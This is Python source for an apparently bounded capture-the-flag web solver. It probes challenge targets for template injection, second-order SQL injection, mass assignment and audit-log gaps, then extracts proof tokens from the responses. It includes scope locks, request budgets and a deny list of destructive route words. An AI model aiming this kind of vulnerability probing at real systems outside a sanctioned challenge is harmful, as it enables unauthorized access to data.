#!/usr/bin/env python3
"""Bounded cold solver for the observed Web POST chains.

This is deliberately narrower than a generic form fuzzer.  It recognizes four
target-local contracts and nothing else:

* POST-bodied SSTI: a clue-named feature route renders into an empty slot.  One
  of four harmless constant-arithmetic syntaxes must be evaluated before the
  solver asks for the scalar ``config`` variable in that same syntax, field,
  and transport.  It never sends reflection, file-read, environment,
  function-call, or command-execution template expressions.
* Second-order SQLi: a clue-named POST route stores an advertised filter field
  and a different clue-named GET route reports
  ``delayed_query_revealed_private_row``.  The read route is snapshotted before
  a small quote-context set, and only its later expansion can be a payoff; a
  generic ``saved`` acknowledgement is never success.
* Mass assignment: a clue-named POST route sits beside a clue-named GET route
  which initially says ``administrator_required``.  Small, separate own-profile
  promotion bodies are tried, and only the same-cookie GET transition from 403
  to an explicitly privileged response can be a payoff.
* Audit-report chain: a clue-named POST-required feature sits beside a GET
  audit route which advertises an exact three-field report schema.  One empty
  JSON POST creates an operation/export id, one fresh audit GET derives the
  event name actually recorded for that id, and one report POST names the
  operation which is absent and the observed event.  Only the exact
  ``decisive_security_event_missing`` effect is a payoff; operation, id and
  observed event are always read from this target's responses.

Every production request goes through ``solvers/toolkits/web.py``'s scope-locked
``WebClient``.  Tests may inject a compatible fake client.  Only GET and POST are
allowed, redirects are not followed, destructive-looking routes are refused,
and an absolute deadline, a request budget, a POST cap, and a stop gate bound
each target.  Target bytes are parsed only as text/JSON; nothing is evaluated,
executed, imported, or deserialized.

Contract (the same shape as ``proof_hunt`` and ``forge_event``)::

    solve(target, ctx=None) -> the event's payoff token | None  (ctf.flagfmt.payoff_kind)
    solve_targets(targets, ctx=None) -> {answer_id: proof | None}

``ctx`` may contain ``deadline``, ``max_requests``, ``prompt``, ``evidence``,
``log_dir``, ``challenge``, ``stop``, and (for integration/tests) ``client``,
``client_factory``, ``preloaded``, and ``baseline_texts``.

Never-wrong proof rule: only one novel exact payoff token (a proof under a proof event, else a flag) from a
class-specific successful payoff is returned.  Plain/baseline values are
subtracted: the same value on plain and payoff responses is ineligible, while a
distinct plain decoy does not hide one novel payoff.  Two novel payoff values
remain ambiguous.  A different-shaped value from a proven payoff is surfaced
for the agent but never returned or submitted.
"""

from __future__ import annotations

import datetime as _dt
import html
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402 -- the sole production transport
import security_json as _security_json  # noqa: E402 -- fail-closed policy JSON

try:
    import forge_event as _proof_policy  # noqa: E402 -- shared bounded response decoding
except Exception:  # pragma: no cover - partial exports retain the historical raw path
    _proof_policy = None


BASELINE_INCOMPLETE = getattr(
    _proof_policy, "BASELINE_STRICT_INCOMPLETE",
    "<!-- csctf-baseline-strict-set:incomplete -->",
)


REQUEST_TIMEOUT = 8.0
DEADLINE_PAD = 0.3
DEFAULT_SECONDS = 35.0
DEFAULT_MAX_REQUESTS = 24
MAX_POSTS = 12
PAIR_READBACK_RESERVE = 0.5
# The audit path mutates before it learns the two values needed for the final
# report.  Reserve one complete configured request window plus deadline pad for
# each POST/GET/POST step; a sub-second floor is not an honest sequence budget.
AUDIT_SEQUENCE_RESERVE = 3 * (REQUEST_TIMEOUT + DEADLINE_PAD)
AUDIT_AFTER_ACTION_RESERVE = 2 * (REQUEST_TIMEOUT + DEADLINE_PAD)
AUDIT_AFTER_READBACK_RESERVE = REQUEST_TIMEOUT + DEADLINE_PAD
POST_SSTI_CONFIRM_CAP = 10
# The scalar an evaluated template exposes is per-event: flag events' templates
# (CSCTF) read ``config``; proof events' templates (Huntress) read ``objective``.
# Both are tried until one renders a scalar, the active event's token model's
# variable first (ssti_payoff_vars), so a proof event spends no POST on
# ``config``.  The names belong in the event profile once it has a web section.
SSTI_PAYOFF_VARS = ("config", "objective")


def ssti_payoff_vars():
    """SSTI_PAYOFF_VARS in the order the active event's payoff model asks them."""
    if flagfmt.payoff_kind() == "proof":
        return ("objective", "config")
    return SSTI_PAYOFF_VARS
SECOND_ORDER_POST_CAP = 4
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
MAX_REQUEST_BODY_BYTES = 32 * 1024

# The event's payoff token (ctf.flagfmt): a proof under a proof event, else a flag. Peers
# (delegated_identity, queued_owner, remote_policy) read PAYOFF_LIKE from here.
PAYOFF_WIRE = flagfmt.PAYOFF_TEXT     # exact: the only value returned
PAYOFF_LIKE = flagfmt.PAYOFF_SHAPE    # payoff-shaped near misses, any case: seen, never returned
PAYOFF_V4 = flagfmt.PAYOFF_UUID4      # the uuid4 summary bit (a validator, never a gate)
OTHER_LIKE = flagfmt.PAYOFF_OTHER     # the other family's shapes: seen, never returned
LABEL_KEY = re.compile(
    r"(?i)(?:^|[_-])(?:proof|evidence|flag|objective|answer|submission|token|secret|success)(?:$|[_-])"
)
LABELLED_TEXT = re.compile(
    r"(?i)\b(?:proof|evidence|flag|objective|answer|submission|token|secret|success)\b\s*[:=]\s*"
    r"(?:[\"']([^\"'\r\n]{3,256})[\"']|([A-Za-z0-9_.:{}@/+=-]{3,256}))"
)
ABSOLUTE_URL = re.compile(
    r"(?i)(?<![A-Za-z0-9+.-])(?:[A-Za-z][A-Za-z0-9+.-]{0,31}:)?//[^\s<>'\"\\{}\[\]]{1,2048}"
)
ENCODED_ABSOLUTE_URL = re.compile(
    r"(?i)(?<![A-Za-z0-9%+.-])(?:[A-Za-z][A-Za-z0-9+.-]{0,31}(?::|%3A))?"
    r"(?:(?:/|%2F){2})[^\s<>'\"\\{}\[\]]{1,4096}"
)

# The three observed routes use process/execute/submit/inspect as their intended
# minimal action.  Words which end or broadly destroy state remain forbidden.
DESTRUCTIVE_PATH = re.compile(
    r"(?i)(?:^|[/_.-])(?:delete|destroy|drop|wipe|purge|remove|truncate|erase|reset|revoke|"
    r"logout|signout|disable|deactivate|uninstall|kill|shutdown|reboot|ban|suspend|cancel|"
    r"rollback|restore|transfer|pay)(?=$|[/_.-]|\d)"
)

_LOW_ROLES = {"analyst", "user", "guest", "viewer", "member", "staff", "operator", "basic", "standard"}
_POST_REQUIRED = {"post_required", "method_post_required", "use_post", "post_only"}
_ADMIN_REQUIRED = {"administrator_required", "admin_required", "requires_administrator", "requires_admin"}
_D12_EFFECT = "delayed_query_revealed_private_row"
_D13_EFFECT = "bound_privileged_property"
_AUDIT_EFFECT = "decisive_security_event_missing"
_AUDIT_FIELDS = frozenset(("export_id", "missing_event", "observed_event"))
_AUDIT_EVENT_KEYS = ("event", "event_type", "type", "name", "action", "operation")


def _snake(value) -> str:
    value = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or ""))
    return re.sub(r"[^a-z0-9]+", "_", value.lower()).strip("_")


def _text(response) -> str:
    if not isinstance(response, dict):
        return ""
    if _proof_policy is not None and hasattr(_proof_policy, "response_text_views"):
        try:
            views = _proof_policy.response_text_views(response)
            return str(views[0])[:MAX_TEXT] if views else ""
        except Exception:
            return ""
    body = response.get("body")
    if body is None and "text" in response:
        body = response.get("text")
    if isinstance(body, (bytes, bytearray)):
        return bytes(body[:MAX_TEXT]).decode("utf-8", "replace")
    return str(body or "")[:MAX_TEXT]


def _baseline_text(response) -> str:
    if _proof_policy is not None and hasattr(_proof_policy, "response_baseline_text"):
        try:
            return _proof_policy.response_baseline_text(response)
        except Exception:
            return ""
    text = _text(response)
    raw = response.get("response_headers", response.get("headers", {})) if isinstance(response, dict) else {}
    headers = "\n".join(str(value)[:4096] for value in raw.values()) if isinstance(raw, dict) else ""
    return (text + ("\n" + headers if headers else ""))[:MAX_TEXT]


def _json_document(response_or_text):
    if isinstance(response_or_text, dict) and _proof_policy is not None \
            and hasattr(_proof_policy, "response_text_views"):
        try:
            views = _proof_policy.response_text_views(response_or_text)
        except Exception:
            return None
    else:
        views = [_text(response_or_text) if isinstance(response_or_text, dict)
                 else str(response_or_text or "")[:MAX_TEXT]]
    try:
        value = _security_json.loads_unique(views, max_chars=MAX_TEXT)
    except Exception:
        return None
    return value if isinstance(value, (dict, list)) else None


def _coherent_json_view(response, expected):
    """Return the sole carrier view that parsed as ``expected`` and its siblings."""
    if _proof_policy is None or not hasattr(_proof_policy, "response_text_views"):
        text = _text(response)
        return (text, []) if text else (None, [])
    try:
        views = list(_proof_policy.response_text_views(response, strict=True))[:256]
    except Exception:
        return None, []
    matches = []
    for view in views:
        try:
            parsed = _security_json.loads(str(view), max_chars=MAX_TEXT)
        except Exception:
            continue
        if parsed == expected:
            matches.append(str(view))
    if len(matches) != 1:
        return None, views
    anchor = matches[0]
    siblings = [str(view) for view in views if str(view) != anchor]
    pairs = response.get("response_header_pairs") if isinstance(response, dict) else None
    if isinstance(pairs, (list, tuple)):
        siblings += [str(row[1]) for row in pairs
                     if isinstance(row, (list, tuple)) and len(row) == 2]
    elif isinstance(response, dict):
        headers = response.get("response_headers", response.get("headers", {}))
        if isinstance(headers, dict):
            siblings += [str(value) for value in headers.values()]
    return anchor, siblings


def _carrier_candidate_scan(values):
    rows = list(values or [])
    incomplete = len(rows) > 512
    out = []
    for text in rows[:512]:
        values_in_text, cut = _candidate_scan(str(text))
        incomplete |= cut
        for value in values_in_text:
            if value in out:
                continue
            if len(out) >= 24:
                incomplete = True
                continue
            out.append(value)
    return out, incomplete


def _carrier_candidates(values):
    return _carrier_candidate_scan(values)[0]


def _walk(value, path=(), depth=0):
    """Walk every node in a document already bounded by ``security_json``."""
    stack = []
    if isinstance(value, dict):
        stack.extend((path + (str(key),), item)
                     for key, item in reversed(list(value.items())))
    elif isinstance(value, list):
        stack.extend((path + (str(index),), item)
                     for index, item in reversed(list(enumerate(value))))
    while stack:
        here, item = stack.pop()
        yield here, item
        if isinstance(item, dict):
            stack.extend((here + (str(key),), child)
                         for key, child in reversed(list(item.items())))
        elif isinstance(item, list):
            stack.extend((here + (str(index),), child)
                         for index, child in reversed(list(enumerate(item))))


def _truthy(value) -> bool:
    return value is True or value == 1 or (
        isinstance(value, str) and value.strip().lower() in
        {"true", "yes", "ok", "success", "accepted", "authorized", "trusted", "solved"}
    )


def _error(doc) -> str:
    if not isinstance(doc, (dict, list)):
        return ""
    for path, value in _walk(doc):
        if path and _snake(path[-1]) == "error" and value not in (None, "", False, 0):
            return _snake(value)
    return ""


def _candidate_scan(text, extra=()):
    """Bounded proof/evidence-like values from untrusted data, in first-seen order."""
    text = str(text or "")[:MAX_TEXT]
    out = []
    incomplete = False

    def add(value):
        nonlocal incomplete
        if not isinstance(value, (str, int)) or isinstance(value, bool):
            return
        value = html.unescape(str(value)).strip()
        if not 3 <= len(value) <= 256 or value.lower() in {
            "null", "none", "true", "false", "ok", "success", "accepted", "pending"
        }:
            return
        if value in out:
            return
        if len(out) >= 24:
            incomplete = True
            return
        out.append(value)

    doc = _json_document(text)
    if isinstance(doc, (dict, list)):
        for path, value in _walk(doc):
            if path and LABEL_KEY.search(_snake(path[-1])):
                add(value)
    for match in PAYOFF_LIKE.finditer(text):
        add(match.group(0))
    for match in OTHER_LIKE.finditer(text):
        add(match.group(0))
    for match in LABELLED_TEXT.finditer(text):
        add(match.group(1) or match.group(2))
    extra_values = list(extra or [])
    if len(extra_values) > 24:
        incomplete = True
    for value in extra_values[:24]:
        add(value)
    return out, incomplete


def _candidate_values(text, extra=()):
    return _candidate_scan(text, extra=extra)[0]


def _proofish(value) -> bool:
    value = str(value or "").strip()
    return bool(PAYOFF_LIKE.fullmatch(value) or OTHER_LIKE.fullmatch(value) or
                re.search(r"(?i)(?:proof|flag|evidence|objective)", value))


def _strip_offhost_urls(text, host=None):
    """Remove flag-format text carried only inside an off-origin absolute URL."""
    value = str(text or "")[:MAX_TEXT]
    wanted = str(host or "").lower().rstrip(".")
    if not wanted:
        return value

    def canonical_layers(raw):
        current = str(raw or "")[:MAX_TEXT]
        layers = []
        stable = False
        for _ in range(13):
            normalized = html.unescape(current)
            normalized = re.sub(r"\\+(?:/|u002f|x2f)", "/", normalized, flags=re.I)
            normalized = re.sub(r"\\+(?:u003a|x3a)", ":", normalized, flags=re.I)
            normalized = re.sub(r"(?i)([a-z][a-z0-9+.-]{0,31}:)\\+", r"\1//", normalized)
            normalized = re.sub(r"(?<![A-Za-z0-9])\\{2,}", "//", normalized)
            if (re.search(r"(?i)(?:https?|ftp|wss?|file):[\\/]", normalized)
                    or re.search(r"(?<![A-Za-z0-9])//", normalized)
                    or normalized.lstrip().startswith("\\\\")):
                normalized = normalized.replace("\\", "/")
            normalized = re.sub(r"(?i)((?:https?|ftp|wss?|file):)/+", r"\1//", normalized)
            normalized = normalized[:MAX_TEXT]
            if not layers or normalized != layers[-1]:
                layers.append(normalized)
            nxt = urllib.parse.unquote_plus(normalized)[:MAX_TEXT]
            if nxt == normalized:
                stable = True
                break
            current = nxt
        return layers, stable

    def url_host(raw):
        try:
            raw = str(raw or "")
            if raw.startswith("//"):
                raw = "http:" + raw
            found = (urllib.parse.urlsplit(raw).hostname or "").lower().rstrip(".")
            if not found and re.match(r"(?i)^(?:(?:https?|ftp|wss?|file):/+|//+)", raw):
                return "!ambiguous-authority"
            return found
        except ValueError:
            return ""

    def replace(match):
        return match.group(0) if url_host(match.group(0)) == wanted else ""

    cleaned = ABSOLUTE_URL.sub(replace, value)

    def replace_encoded(match):
        raw = match.group(0)
        layers, stable = canonical_layers(raw)
        hosts = [url_host(item) for item in layers]
        if not stable:
            return ""
        return raw if not any(found and found != wanted for found in hosts) else ""

    cleaned = ENCODED_ABSOLUTE_URL.sub(replace_encoded, cleaned)
    offhost_tokens = set()
    whole_offhost = False
    layers, stable = canonical_layers(value)
    for decoded in layers:
        whole = ABSOLUTE_URL.fullmatch(decoded.strip())
        if whole is not None and url_host(whole.group(0)) not in ("", wanted):
            whole_offhost = True
        for match in ABSOLUTE_URL.finditer(decoded):
            if url_host(match.group(0)) not in ("", wanted):
                carrier = match.group(0)
                offhost_tokens.update(item.group(0) for rx in (PAYOFF_LIKE, OTHER_LIKE)
                                      for item in rx.finditer(carrier))
    if not stable or whole_offhost:
        return ""
    for token in sorted(offhost_tokens, key=len, reverse=True):
        cleaned = re.sub(re.escape(token), "", cleaned, flags=re.I)
    return cleaned


def extract_anchored(response, baseline_texts=(), extra=(), *, anchored=False, host=None):
    """Extract one strict novel proof from a class-specific proven payoff.

    ``anchored`` is decided by the three strategies, never by a bare HTTP 2xx.
    Nonstandard values from that payoff are returned in ``candidates`` only.
    """
    text = _strip_offhost_urls(_text(response), host)
    baseline_items = list(baseline_texts or [])
    baseline_incomplete = (len(baseline_items) > 80
                           or any(len(str(item or "")) > MAX_TEXT
                                  for item in baseline_items[:80]))
    raw_baselines = [str(item or "") for item in baseline_items[:80]]
    baselines = [_strip_offhost_urls(item, host) for item in raw_baselines]
    # Controls are subtractive only.  Union their raw tokens with the strict
    # carrier-filtered view so fail-closed blanking of an ambiguous/deep URL
    # cannot make a separate plain control decoy look novel later.  Nothing
    # from the raw view is ever eligible as a payoff candidate.
    baseline_views = raw_baselines + baselines
    baseline_candidates = set()
    for body in baseline_views:
        found, cut = _candidate_scan(body)
        baseline_candidates.update(found)
        baseline_incomplete |= cut
    baseline_keys = {value.casefold() if PAYOFF_LIKE.fullmatch(value) else value
                     for value in baseline_candidates}
    baseline_proofish = {match.group(0).casefold() for body in baseline_views
                         for match in PAYOFF_LIKE.finditer(body)}
    if _proof_policy is not None and hasattr(_proof_policy, "baseline_set_incomplete"):
        try:
            baseline_incomplete |= bool(_proof_policy.baseline_set_incomplete(raw_baselines))
        except Exception:
            baseline_incomplete = True
    else:
        marker = "<!-- csctf-baseline-strict-set:incomplete -->"
        baseline_incomplete |= any(marker in value for value in raw_baselines)
    if not anchored:
        return {"auto": None, "candidates": [], "wire": [], "uuid4": False,
                "baseline_incomplete": baseline_incomplete}

    extra_values = list(extra or [])
    scan_incomplete = len(extra_values) > 24
    safe_extra = [_strip_offhost_urls(value, host) for value in extra_values[:24]]
    values, cut = _candidate_scan(text, extra=safe_extra)
    scan_incomplete |= cut
    novel = [value for value in values
             if (value.casefold() if PAYOFF_LIKE.fullmatch(value) else value) not in baseline_keys]
    wire = list(dict.fromkeys(
        match.group(0) for match in PAYOFF_WIRE.finditer(text)
        if match.group(0).casefold() not in baseline_proofish
    ))
    # An exact proof supplied as a class-specific extracted value (for example a
    # decoded <pre> slot) is equivalent to the same bytes in the body.
    for value in novel:
        if PAYOFF_WIRE.fullmatch(value) and value not in wire:
            wire.append(value)

    proofish = [value for value in novel if _proofish(value)]
    auto = wire[0] if len(wire) == 1 else None
    if auto is not None and any(value != auto for value in proofish):
        auto = None
    if baseline_incomplete or scan_incomplete:
        auto = None
    candidates = [value for value in novel if value != auto]
    return {"auto": auto, "candidates": candidates[:12], "wire": wire[:12],
            "uuid4": bool(auto and PAYOFF_V4.fullmatch(auto)),
            "baseline_incomplete": baseline_incomplete,
            "scan_incomplete": scan_incomplete}


def _normal_response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode("utf-8")
        return out
    return None


def _same_origin_route(value, base_url):
    """A target-authored same-origin, non-destructive path, or ``None``."""
    try:
        path = _web.safe_same_origin_route(
            value, base_url, allow_query=False, max_bytes=MAX_ROUTE_BYTES)
        if path is None:
            return None
        for decoded in _web.canonical_route_layers(path, max_bytes=MAX_ROUTE_BYTES) or ():
            folded = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", decoded)
            if (DESTRUCTIVE_PATH.search(folded)
                    or _web.route_has_destructive_action(decoded)):
                return None
        return path
    except Exception:
        return None


def _origin(value):
    try:
        parts = urllib.parse.urlsplit(str(value or ""))
        if (parts.scheme not in ("http", "https") or not parts.hostname
                or parts.username is not None or parts.password is not None
                or parts.fragment or "@" in parts.netloc):
            return None
        return parts.scheme, parts.hostname.lower(), parts.port or (443 if parts.scheme == "https" else 80)
    except Exception:
        return None


def _class_on(name) -> bool:
    env = "CTF_WEB_" + name.upper()
    value = ctf_env.get(env)
    if value is not None:
        return value.strip().lower() not in {"off", "0", "false", "no"}
    try:
        root = ctf_paths.workdir()
        if (root / ("_" + name.lower() + ".off")).exists():
            return False
    except Exception:
        return False
    return True


def enabled() -> bool:
    return _class_on("post_chain")


class _Runner:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None \
                else time.time() + DEFAULT_SECONDS
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.requests = 0
        self.posts = 0
        self.responses = []
        self.baseline_texts = []
        supplied_baselines = list(self.ctx.get("baseline_texts") or [])
        baseline_overflow = len(supplied_baselines) > 80
        for value in supplied_baselines[:80]:
            raw = str(value or "")
            baseline_overflow |= len(raw) > MAX_TEXT
            value = raw[:MAX_TEXT]
            if value and value not in self.baseline_texts:
                self.baseline_texts.append(value)
        if baseline_overflow and BASELINE_INCOMPLETE not in self.baseline_texts:
            self.baseline_texts.append(BASELINE_INCOMPLETE)
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        self.cache = {}
        self.cls = None
        self.success = False
        self.candidates = []
        self.uuid4 = False
        self.where = None
        self.stopped = None
        self.t0 = time.time()
        self._gate = threading.Lock()
        self._stopped = False
        self.client = None
        try:
            if self.ctx.get("client") is not None:
                candidate = self.ctx["client"]
                client_origin = _origin(getattr(candidate, "base", None))
                target_origin = _origin(self.url)
                if client_origin is not None and target_origin is not None and client_origin == target_origin:
                    self.client = candidate
                else:
                    self.stopped = "client scope mismatch"
            elif callable(self.ctx.get("client_factory")):
                candidate = self.ctx["client_factory"](self.url, REQUEST_TIMEOUT)
                client_origin = _origin(getattr(candidate, "base", None))
                target_origin = _origin(self.url)
                if client_origin is not None and target_origin is not None and client_origin == target_origin:
                    self.client = candidate
                else:
                    self.stopped = "client scope mismatch"
            else:
                self.client = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"

    def left(self):
        return self.deadline - time.time() if self.deadline is not None else None

    def stop_now(self):
        # The same lock surrounds the actual client call.  When this returns, no
        # in-flight call remains and no later call can begin.
        with self._gate:
            self._stopped = True

    def _may_send_locked(self):
        if self._stopped:
            self.stopped = self.stopped or "stopped"
            return False
        if hasattr(self.external_stop, "is_set") and self.external_stop.is_set():
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.posts >= MAX_POSTS:
            self.stopped = self.stopped or "max_posts"
            return False
        left = self.left()
        if left is not None and left <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def _can_complete_mutation_readback(self):
        """Reserve capacity and a small time floor before a stateful POST.

        The runner is sequential, so proving both slots exist atomically under
        its wire gate prevents its own mutation from consuming the final slot.
        Transport failure can still end a pair, but budget/deadline accounting
        can no longer create the unsafe partial by itself.
        """
        with self._gate:
            if self.client is None or not self._may_send_locked():
                return False
            if self.requests + 2 > self.max_requests or self.posts + 1 > MAX_POSTS:
                self.stopped = self.stopped or "insufficient budget for mutation/readback pair"
                return False
            left = self.left()
            if left is not None and left <= DEADLINE_PAD + PAIR_READBACK_RESERVE:
                self.stopped = self.stopped or "insufficient time for mutation/readback pair"
                return False
            return True

    def _can_complete_sequence(self, requests, posts, *, reserve):
        """Atomically reserve a bounded multi-step protocol before its first mutation."""
        with self._gate:
            if self.client is None or not self._may_send_locked():
                return False
            try:
                requests, posts = int(requests), int(posts)
            except (TypeError, ValueError):
                return False
            if (requests < 1 or posts < 0 or self.requests + requests > self.max_requests
                    or self.posts + posts > MAX_POSTS):
                self.stopped = self.stopped or "insufficient budget for bounded POST sequence"
                return False
            left = self.left()
            if left is not None and left <= max(DEADLINE_PAD, float(reserve)):
                self.stopped = self.stopped or "insufficient time for bounded POST sequence"
                return False
            return True

    def _request(self, method, route, *, data=None, headers=None, role="plain", reserve_after=0.0):
        method = str(method).upper()
        if method not in {"GET", "POST"}:
            self.stopped = self.stopped or f"refused verb {method}"
            return None
        path = _same_origin_route(route, self.url)
        if path is None:
            self.stopped = self.stopped or "refused unsafe/off-host route"
            return None
        if data is not None:
            encoded = data if isinstance(data, bytes) else str(data).encode("utf-8", "replace")
            if len(encoded) > MAX_REQUEST_BODY_BYTES:
                self.stopped = self.stopped or "refused oversized request body"
                return None
        headers = dict(headers or {})
        # This tool creates only Content-Type.  Refuse caller-supplied authority
        # material so a challenge platform token can never cross this seam.
        if any(str(key).lower() in {"authorization", "proxy-authorization", "cookie"} for key in headers):
            self.stopped = self.stopped or "refused authority header"
            return None
        with self._gate:
            if self.client is None or not self._may_send_locked():
                return None
            left = self.left()
            reserve_after = max(0.0, float(reserve_after))
            if left is not None and left <= DEADLINE_PAD + reserve_after:
                self.stopped = self.stopped or "insufficient time for reserved follow-up"
                return None
            try:
                self.client.timeout = REQUEST_TIMEOUT if left is None else max(
                    0.2, min(REQUEST_TIMEOUT, left - 0.1 - reserve_after)
                )
            except Exception:
                pass
            self.requests += 1
            if method == "POST":
                self.posts += 1
            try:
                response = self.client.request(method, path, data=data, headers=headers, allow_redirects=False)
            except Exception as exc:
                self.responses.append({"method": method, "path": path, "status": None,
                                       "role": role, "error": type(exc).__name__})
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
        self.responses.append({"method": method, "path": path,
                               "status": response.get("status") if isinstance(response, dict) else None,
                               "role": role})
        return response if isinstance(response, dict) else None

    def _remember_baseline(self, response):
        if response is None:
            return
        value = _baseline_text(response)
        if value not in self.baseline_texts:
            self.baseline_texts.append(value)

    def get(self, route, role="plain", *, fresh=False, reserve_after=0.0):
        path = _same_origin_route(route, self.url)
        if path is None:
            self.stopped = self.stopped or "refused unsafe/off-host route"
            return None
        if not fresh and path in self.cache:
            return self.cache[path]
        if not fresh and path in self.preloaded:
            response = _normal_response(self.preloaded[path])
            if response is not None:
                self.cache[path] = response
                self._remember_baseline(response)
                return response
        response = self._request("GET", path, role=role, reserve_after=reserve_after)
        if response is not None and not fresh:
            self.cache[path] = response
            self._remember_baseline(response)
        return response

    def post(self, route, payload, encoding, role, *, reserve_after=0.0):
        if encoding == "form":
            data = urllib.parse.urlencode(payload, doseq=False)
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        else:
            data = json.dumps(payload, separators=(",", ":"), ensure_ascii=False)
            headers = {"Content-Type": "application/json"}
        return self._request("POST", route, data=data, headers=headers, role=role,
                             reserve_after=reserve_after)

    def _record_payoff(self, response, *, extra=(), where, payoff_text=None):
        # The class-specific reader may select one coherent render slot / JSON
        # document as its payoff.  Every other body view and response-header
        # value remains ambiguity evidence: synthesizing the selected value
        # must not erase a distinct proof carried by a sibling or header.
        ambient = []
        ambient_incomplete = False
        if isinstance(response, dict):
            if _proof_policy is not None and hasattr(_proof_policy, "response_text_views"):
                try:
                    ambient.extend(_proof_policy.response_text_views(response, strict=True))
                except Exception:
                    ambient = []
            pairs = response.get("response_header_pairs")
            if isinstance(pairs, (list, tuple)):
                if len(pairs) > 512 or any(
                        not isinstance(row, (list, tuple)) or len(row) != 2 for row in pairs):
                    ambient_incomplete = True
                ambient.extend(str(row[1]) for row in pairs[:512]
                               if isinstance(row, (list, tuple)) and len(row) == 2)
            else:
                headers = response.get("response_headers", response.get("headers", {}))
                if isinstance(headers, dict):
                    if len(headers) > 512:
                        ambient_incomplete = True
                    ambient.extend(str(value) for value in list(headers.values())[:512])
        payoff_host = urllib.parse.urlsplit(self.url).hostname
        cleaned_ambient = []
        strict_marks = []
        for raw in ambient:
            if len(raw) > MAX_TEXT:
                ambient_incomplete = True
            cleaned = _strip_offhost_urls(raw[:MAX_TEXT], payoff_host)
            cleaned_ambient.append(cleaned)
            # Strict marks have their own channel and cannot be displaced by
            # the generic first-24 candidate budget.
            for regex in (PAYOFF_LIKE, OTHER_LIKE):
                for match in regex.finditer(cleaned):
                    value = match.group(0)
                    if value not in strict_marks:
                        strict_marks.append(value)
                        if len(strict_marks) > 64:
                            ambient_incomplete = True
                            break
        ambiguity, ambiguity_incomplete = _carrier_candidate_scan(cleaned_ambient)
        ambient_incomplete |= ambiguity_incomplete
        extra_values = list(extra or [])
        if len(extra_values) > 24:
            ambient_incomplete = True
        extracted = extra_values[:24]
        extracted.extend(value for value in ambiguity if value not in extracted)
        source = response
        if payoff_text is not None:
            source = dict(response or {})
            source["body"] = str(payoff_text)[:MAX_TEXT].encode("utf-8", "replace")
            # The selected coherent view is now the complete synthetic entity;
            # retaining the original multipart/archive Content-Type would make
            # the shared decoder reinterpret it under the wrong framing.
            source["response_headers"] = {"Content-Type": "text/plain; charset=utf-8"}
            source.pop("response_header_pairs", None)
            source.pop("headers", None)
        info = extract_anchored(
            source, self.baseline_texts, extra=extracted, anchored=True,
            host=payoff_host,
        )
        ambient_incomplete |= bool(info.get("scan_incomplete"))
        auto = info.get("auto")
        if (ambient_incomplete or (auto is not None and any(
                value.casefold() != str(auto).casefold() for value in strict_marks))):
            info["auto"] = None
            info["uuid4"] = False
        info["candidates"] = list(dict.fromkeys(
            strict_marks + list(info.get("candidates") or [])
        ))[:24]
        self.success = True
        self.where = where
        self.uuid4 = bool(info["uuid4"])
        self.candidates = list(info["candidates"])
        if ambient_incomplete:
            self.stopped = self.stopped or "payoff ambiguity exceeded bounded candidate scan"
        if info["auto"] is None:
            self.candidates += [value for value in info.get("wire", []) if value not in self.candidates]
        return info["auto"]

    @staticmethod
    def _render_values(response):
        body = _text(response)
        values = []
        for match in re.finditer(r"(?is)<(?:pre|textarea|output)[^>]*>(.*?)</(?:pre|textarea|output)>", body):
            value = html.unescape(re.sub(r"(?is)<[^>]+>", "", match.group(1))).strip()
            if value and value not in values:
                values.append(value)
        return values[:8]

    def _post_ssti_applicable(self, clues, root, feature_response, prompt):
        if not _class_on("post_ssti"):
            return False
        body = _text(feature_response)
        has_empty_slot = bool(re.search(
            r"(?is)<(?:pre|textarea|output)[^>]*>\s*</(?:pre|textarea|output)>", body
        ))
        rendered = bool(re.search(
            r"(?i)rendered\s+(?:message|template)|template\s+(?:preview|output)", body
        ))
        prompted = bool(re.search(r"(?i)\b(?:template|evaluat(?:e|es|ed|ion)|expression|incantation)\b", prompt))
        clue_text = json.dumps(clues, separators=(",", ":"), default=str)[:20_000]
        target_named = bool(re.search(
            r"(?i)(?:template|renderer|render_engine|expression_engine|template_engine)", clue_text
        ))
        return (isinstance(feature_response, dict) and feature_response.get("status") == 200 and
                has_empty_slot and rendered and (prompted or target_named))

    @staticmethod
    def _ssti_fields(clues):
        out = []
        for key in ("template_field", "body_field", "message_field", "input_field", "field"):
            value = clues.get(key)
            if isinstance(value, str) and re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,40}", value):
                if value not in out:
                    out.append(value)
        for value in ("template", "message", "content", "text", "input"):
            if value not in out:
                out.append(value)
        return out[:5]

    @staticmethod
    def _ssti_encodings(clues):
